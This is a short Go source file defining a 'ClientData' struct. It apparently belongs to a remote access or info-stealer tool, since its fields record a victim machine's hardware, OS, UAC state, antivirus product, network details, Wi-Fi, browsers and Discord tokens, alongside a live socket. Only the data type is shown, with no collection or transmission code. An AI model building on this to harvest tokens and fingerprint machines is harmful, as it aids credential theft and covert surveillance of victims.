package common

import "net"

type ClientData struct {
	ComputerName    string `json:"computer_name"`
	ComputerOS      string `json:"computer_os"`
	ComputerVersion string `json:"computer_version"`
	TotalMemory     uint64 `json:"total_memory"`
	UpTime          string `json:"up_time"`
	UUID            string `json:"uuid"`
	CPU             string `json:"cpu"`
	GPU             string `json:"gpu"`
	UAC             bool   `json:"uac"`
	AntiVirus       string `json:"anti_virus"`

	IPAddress  string `json:"ip"`
	ClientIP   string `json:"client_ip"`
	Country    string `json:"country"`
	Timezone   string `json:"timezone"`
	MACAddress string `json:"mac_address"`
	Gateway    string `json:"gateway"`
	SubnetMask string `json:"subnet_mask"`
	DNS        string `json:"dns"`
	ISP        string `json:"isp"`

	Disks string `json:"disks"`

	Wifi string `json:"wifi"`

	Webbrowsers   []string   `json:"webbrowsers"`
	DiscordTokens [][]string `json:"discord_tokens"`

	Addr   net.Addr
	Socket net.Conn
}
